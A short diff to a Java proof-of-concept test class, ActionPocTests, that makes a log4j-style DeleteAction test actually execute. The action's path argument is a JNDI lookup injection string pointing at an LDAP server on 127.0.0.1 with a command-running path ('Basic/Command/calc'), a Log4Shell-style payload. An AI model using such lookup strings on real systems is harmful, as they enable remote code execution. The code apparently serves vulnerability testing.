@@ -49,10 +49,11 @@ public class ActionPocTests {
     }
 
     @Test
-    public void executeDeleteActionTest() {
+    public void executeDeleteActionTest() throws IOException {
         DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
                 IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
         }, null, new DefaultConfiguration());
+        action.execute();
     }
 
     @Test
